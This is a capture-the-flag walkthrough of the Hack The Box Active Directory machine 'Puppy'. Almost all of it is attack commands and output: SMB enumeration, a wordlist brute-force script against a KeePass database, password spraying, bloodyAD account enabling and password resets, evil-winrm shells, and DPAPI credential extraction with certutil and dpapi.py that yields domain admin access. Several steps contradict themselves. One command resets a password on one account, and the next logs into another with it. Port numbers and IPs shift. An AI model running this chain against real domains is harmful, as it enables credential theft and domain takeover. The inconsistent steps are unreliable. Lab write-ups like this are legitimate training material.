![](Phttps://labs.hackthebox.com/storage/avatars/6a127b39657062e42c1a8dfdcd23475d.png)
Nmap machine results
```
3/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-18 02:03:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Using the given credentials to list the shares
```bash
crackmapexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares
```
```
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [+] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 

```

```bash
smbclient -U 'PUPPY.HTB\levi.james%KingofAkron2025!' //10.10.11.70/DEV
```
```
smb: \> dir
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1523165 blocks available

```

Cracking 'recovery.kdbx' using keepass2john faced issues, 
```
keepass2john recovery.kdbx > hash
! recovery.kdbx : File version '40000' is currently not supported!
```

so I used simple python script:
```
from pykeepass import PyKeePass
from tqdm import tqdm

db_path = 'recovery.kdbx'
wordlist_path = '/usr/share/wordlists/rockyou.txt'

with open(wordlist_path, 'r', encoding='latin-1') as f:
    passwords = f.readlines()

for password in tqdm(passwords):
    password = password.strip()
    try:
        kp = PyKeePass(db_path, password=password)
        print(f'[+] Password found: {password}')
        break
    except Exception:
        continue
```
```
  0%|                                                                                                                                                                   | 35/14344392 [00:18<1975:22:31,  2.02it/s][+] Password found: liverpool
  0%|                                                                                                                                                                   | 35/14344392 [00:18<2133:31:56,  1.87it/s]
```
Dumping the domain users using the keepassxc GUI:
```bash
keepassxc recovery.kdbx
```

Revealed those users
```
ADAM SILVER:HJKL2025!
ANTONY C. EDWARDS:Antman2025!
JAMIE WILLIAMSON:JamieLove2025!
SAMUEL BLAKE:ILY2025!
STEVE TUCKER:Steve2025!
```
```bash
nxc smb DC.PUPPY.HTB -u usernames -p passwords
```
```
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_ACCOUNT_DISABLED
```

```bash
bloodhound-python -u levi.james -p 'KingofAkron2025!' -d 'PUPPY.HTB' -dc-ip 10.10.11.70 --collection-method All
```
It appears that the user **levi.james** belongs to the **HR** group, which has been granted the **GenericWrite** permission over the **DEVELOPERS** group. This level of access allows us to modify group membership—specifically, we can add our own user account to the DEVELOPERS group. To carry out this action, we can utilize the **BloodyAD** tool.

```bash
bloodyAD -u ant.edwards -p 'Antman2025!' -d PUPPY.HTB --dc-ip 10.10.11.70 set object adam.silver userAccountControl -v 66048 --host 10.10.11.70
```
Right after activating the user, changing his password
```bash
bloodyAD -u ant.edwards -p 'Antman2025!'  -d PUPPY.HTB --dc-ip 10.10.11.70  set object steph.cooper_adm unicodePwd -v '"NewPassword123!"' --host 10.10.11.70
```

Claiming the user flag:
```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'NewPassword123!'
```
```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> ls
	Directory: C:\Users\adam.silver\Desktop
	
	
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
	-ar---         5/19/2025   8:54 AM             34 user.txt
```
Searching the machine, led me to
```
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```
Unzipping and searching, revealed...
```bash
grep -r "password" .
```
```
./nms-auth-config.xml.bak:        <bind-password>ChefSteph2025!</bind-password>
```
```bash
nxc winrm DC.PUPPY.HTB -u steph.cooper -p 'ChefSteph2025!'
```
```
WINRM       10.129.16.111   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.16.111   5985   DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (Pwn3d!)
```

***PE
```
Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Users\steph.cooper\AppData> gci -force Roaming\Microsoft\Protect


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
-a-hs-          3/8/2025   7:40 AM             24 CREDHIST
-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST

*Evil-WinRM* PS C:\Users\steph.cooper\AppData> gci -force Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

To exfiltrate the blobs, we can use **`certutil`** to convert the files into Base64 format on the target machine. Once encoded, we can transfer them to our own system and decode them back to their original form locally.
```
*Evil-WinRM* PS C:\tmp> certutil -encode C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 .\masterkey.b64
Input Length = 740
Output Length = 1076
CertUtil: -encode command completed successfully.

*Evil-WinRM* PS C:\tmp> certutil -encode C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 .\cred.b64
Input Length = 414
Output Length = 626
CertUtil: -encode command completed successfully.
```
At this stage, we can transfer the Base64-encoded strings to our own machine, decode them, and save the output to a file. Once that's done, we can use **`dpapi.py`** to extract the credentials from the decrypted data.
```
echo 'AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3Ieag
tPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA
aQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93
s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8
AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYP
SiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1Esx
FdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0a
vyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8Q
mFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc' | base64 -d > cred.txt

echo 'AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYA
LQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAA
iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOAr
ghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX
7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWv
l1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAA
CYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVW
DQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+
FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/j
jlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y
7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp
4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2
aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7
BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRf
c8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoEx
L3I5Tm2a/F6/oscc9YlciWKEmqQ=' | base64 -d > masterkey.txt

dpapi.py masterkey -file masterkey.txt -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

dpapi.py credential -file cred -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Bingo, 'steph.cooper_adm' is part of the Domain Admin group...
```
evil-winrm -i 10.10.11.70 -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/19/2025   8:54 AM             34 root.txt
```